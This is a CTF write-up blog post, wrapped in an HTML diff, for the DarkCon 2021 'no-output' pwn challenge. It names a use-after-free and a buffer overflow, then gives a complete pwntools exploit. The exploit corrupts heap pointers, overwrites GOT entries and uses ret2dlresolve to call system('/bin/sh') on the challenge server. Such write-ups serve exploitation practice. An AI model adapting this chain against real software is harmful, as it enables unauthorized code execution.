@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>DarkCon 2021 CTF | xrivendell7&#39;s ctf blog（佩奇小屋）</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="no-outputVulnerabilities:  uaf in edit(0x40140c) buffer overflow in init(0x401236)  Exploit:  no read or write function no leak return to dl_resolve write fake reloc&#x2F;sym in .bss use uaf write fre">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DarkCon 2021 CTF">
+<meta property="og:url" content="http://example.com/2021/02/25/2021darkconctf/index.html">
+<meta property="og:site_name" content="xrivendell7&#39;s ctf blog（佩奇小屋）">
+<meta property="og:description" content="no-outputVulnerabilities:  uaf in edit(0x40140c) buffer overflow in init(0x401236)  Exploit:  no read or write function no leak return to dl_resolve write fake reloc&#x2F;sym in .bss use uaf write fre">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-02-25T03:07:10.000Z">
+<meta property="article:modified_time" content="2025-11-18T07:43:31.032Z">
+<meta property="article:author" content="xrivendell7">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="xrivendell7's ctf blog（佩奇小屋）" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">xrivendell7&#39;s ctf blog（佩奇小屋）</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2021darkconctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/25/2021darkconctf/" class="article-date">
+  <time class="dt-published" datetime="2021-02-25T03:07:10.000Z" itemprop="datePublished">2021-02-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      DarkCon 2021 CTF
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="no-output"><a href="#no-output" class="headerlink" title="no-output"></a>no-output</h2><p>Vulnerabilities:</p>
+<ul>
+<li>uaf in edit(0x40140c)</li>
+<li>buffer overflow in init(0x401236)</li>
+</ul>
+<p>Exploit:</p>
+<ul>
+<li>no read or write function</li>
+<li>no leak</li>
+<li>return to dl_resolve<ul>
+<li>write fake reloc&#x2F;sym in .bss use uaf</li>
+<li>write free@GOT to init and <code>__stack_chk_fail</code> to ret</li>
+<li>stack overflow for return to <code>dl_runtime_reslove</code></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = <span class="string">&#x27;nooutput&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST,PORT = <span class="string">&quot;13.233.166.242&quot;</span>, <span class="number">49153</span></span><br><span class="line">p = remote(HOST, PORT)</span><br><span class="line"><span class="comment"># p = process(&#x27;./nooutput&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./nooutput&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz,cnt</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">    p.send(cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,cnt</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.send(cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(e, symbol=<span class="string">&#x27;system&#x27;</span>, args=[<span class="string">&#x27;/bin/sh\x00&#x27;</span>])</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x58</span>, <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x58</span>, <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(dlresolve.data_addr).ljust(<span class="number">0x58</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x58</span>, <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x58</span>, dlresolve.payload.ljust(<span class="number">0x58</span>,<span class="string">&#x27;\0&#x27;</span>)) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x18</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x18</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x404018</span>).ljust(<span class="number">0x18</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x18</span>,<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line"><span class="comment"># free -&gt; 0x401236</span></span><br><span class="line"><span class="comment"># __stack_chk_fail -&gt; ret</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x18</span>,p64(<span class="number">0x401236</span>)+p64(<span class="number">0x4011B0</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># ret</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+rop.chain()+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/25/2021darkconctf/" data-id="cuidmWKGi4xT1VkdP4w4dWQjG" data-title="DarkCon 2021 CTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/08/16/2021ijctf/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          IJCTF 2021
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/02/16/2021dicectf/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Dice 2021 CTF</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
+          </li>
+        
+          <li>
+            <a href="/2025/11/01/qwb2025-re/">qwb2025-re</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/25/qwb2025-pwn/">qwb2025-pwn flagmarket</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/18/train0927/">train0927</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/10/junior/">n1ctf junior 2/2 web</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 xrivendell7<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
